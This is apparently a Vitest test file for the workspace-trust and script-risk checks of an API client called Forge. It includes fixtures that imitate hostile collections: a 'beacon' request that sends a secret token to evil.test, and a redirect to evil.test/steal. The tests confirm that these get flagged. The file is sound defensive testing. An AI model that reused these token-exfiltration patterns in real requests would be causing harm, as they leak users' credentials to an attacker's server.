import { beforeEach, describe, expect, it, vi } from "vitest";
vi.mock("../ipc", () => ({ fs: { write: async () => {}, writeSettings: async () => {} }, http: {}, uid: () => "x" }));
vi.stubGlobal("window", globalThis);
import { webcrypto } from "node:crypto";
import { knownHosts } from "../../agent/egress";
import { sha256Sync } from "../crypto";
import { requestRisk } from "../scriptGuard";
import { useStore } from "../store";
import { canonical, fingerprint } from "../trust";
import { defaults, type Item } from "../types";

const subtle = async (s: string | Uint8Array) => Buffer.from(await webcrypto.subtle.digest("SHA-256", typeof s === "string" ? new TextEncoder().encode(s) : s)).toString("hex");

describe("sha256Sync", () => {
  it("matches Web Crypto at padding edges, for Unicode and for large input", async () => {
    const big = new Uint8Array(1_000_003).map((_, i) => (i * 31) & 255);
    for (const s of ["", "abc", "a".repeat(55), "a".repeat(56), "a".repeat(63), "a".repeat(64), "a".repeat(119), "héllo ✓ 日本 🚀", big]) expect(sha256Sync(s)).toBe(await subtle(s));
  });
});

const http = (path: string, url: string, extra: object = {}): Item => ({ ...defaults.http(), name: path, path, url, ...extra }) as Item;

describe("fingerprints", () => {
  it("ignore key order, names, descriptions and paths, but not what the request does", () => {
    const a = http("collections/A/one.json", "https://api.test/x");
    expect(canonical({ b: 1, a: [2, { d: 3, c: undefined }] })).toBe('{"a":[2,{"d":3}],"b":1}');
    expect(fingerprint({ ...a, name: "Renamed", path: "collections/B/two.json", description: "docs" } as Item)).toBe(fingerprint(a));
    const reversed = (o: object): any => (Array.isArray(o) ? o.map(reversed) : o && typeof o === "object" ? Object.fromEntries(Object.entries(o).reverse().map(([k, v]) => [k, reversed(v)])) : o);
    expect(fingerprint(reversed(a))).toBe(fingerprint(a));
    expect(fingerprint({ ...a, url: "https://evil.test/x" } as Item)).not.toBe(fingerprint(a));
    expect(fingerprint({ ...a, postScript: "pm.environment.set('x', 1)" } as Item)).not.toBe(fingerprint(a));
  });
});

describe("workspace trust", () => {
  beforeEach(() => {
    useStore.setState({ root: "/ws", items: {}, envs: [], trustPrints: new Set(), trustAsked: true, trustEverything: false, settings: { ...useStore.getState().settings, trust: {} } });
  });

  it("asks once, then trusts everything as it was", () => {
    useStore.setState({ trustAsked: false, items: { a: http("a", "https://api.mine.test/x") } });
    expect(useStore.getState().isTrusted(useStore.getState().items.a)).toBe(false);
    useStore.getState().decideWorkspaceTrust(true);
    expect(useStore.getState().trustAsked).toBe(true);
    expect(useStore.getState().isTrusted(useStore.getState().items.a)).toBe(true);
  });

  it("stops trusting a request that changed outside Forge, like in a git pull", () => {
    const mine = http("collections/A/mine.json", "https://api.mine.test/x");
    useStore.setState({ items: { [mine.path]: mine } });
    useStore.getState().trust([mine.path]);
    expect([...knownHosts({}, []).keys()]).toEqual(["api.mine.test"]);
    // The file now points somewhere else, and nobody edited it in Forge.
    useStore.setState({ items: { [mine.path]: { ...mine, url: "https://evil.test/x" } as Item } });
    expect([...knownHosts({}, []).keys()]).toEqual([]);
    expect([...knownHosts({}, [], [], true).keys()]).toEqual(["evil.test"]);
  });

  it("trusts what you create and edit, and keeps trust through renames and AI descriptions", async () => {
    await useStore.getState().createItem("collections/A", "http", "New", { ...defaults.http(), url: "https://api.mine.test/a" });
    const path = Object.keys(useStore.getState().items)[0];
    expect(useStore.getState().isTrusted(useStore.getState().items[path])).toBe(true);
    useStore.getState().updateItem(path, { url: "https://api.mine.test/b" });
    useStore.getState().updateItem(path, { name: "Renamed" });
    useStore.getState().updateItem(path, { description: "Written by AI" });
    expect(useStore.getState().isTrusted(useStore.getState().items[path])).toBe(true);
    // Superseded prints are dropped as you type, so the record doesn't grow with every keystroke.
    expect(useStore.getState().trustPrints.size).toBe(1);
  });

  it("doesn't trust imports or AI-saved requests until you edit or trust them", async () => {
    await useStore.getState().createItem("collections/I", "http", "Beacon", { ...defaults.http(), url: "https://evil.test/b" }, { trusted: false });
    const path = Object.keys(useStore.getState().items)[0];
    expect(useStore.getState().isTrusted(useStore.getState().items[path])).toBe(false);
    useStore.getState().updateItem(path, { description: "AI docs" });
    expect(useStore.getState().isTrusted(useStore.getState().items[path])).toBe(false);
    useStore.getState().trust(["collections/I"]);
    expect(useStore.getState().isTrusted(useStore.getState().items[path])).toBe(true);
  });

  it("doesn't let an untrusted collection vouch for its own server in a script check", () => {
    // The bad collection: a request to its server carrying {{token}}, and a script that redirects
    // another request there.
    const beacon = http("collections/H/beacon.json", "https://evil.test/beacon", { headers: [{ key: "X-T", value: "{{token}}", enabled: true }] });
    const sync = http("collections/H/sync.json", "https://api.mine.test/public");
    const mine = http("collections/A/orders.json", "https://api.mine.test/orders", { auth: { type: "bearer", token: "{{token}}" } });
    useStore.setState({ items: { [beacon.path]: beacon, [sync.path]: sync, [mine.path]: mine }, envs: [{ name: "E", path: "environments/e.json", vars: [], secrets: [{ key: "token", value: "secret-token-123", enabled: true }] }], activeEnv: "environments/e.json" });
    useStore.getState().trust([mine.path]);
    const vars = { token: "secret-token-123" };
    const redirected = { ...sync, url: "https://evil.test/steal" } as Item & typeof sync;
    const risk = requestRisk(sync as any, redirected as any, vars, vars, []);
    expect(risk?.summary).toMatch(/redirected this request to evil\.test.*Only requests you haven't trusted use it\./);
    // Trusting the beacon makes its host yours, as for any request you wrote.
    useStore.getState().trust([beacon.path]);
    expect(requestRisk(sync as any, redirected as any, vars, vars, [])).toBeNull();
  });
});
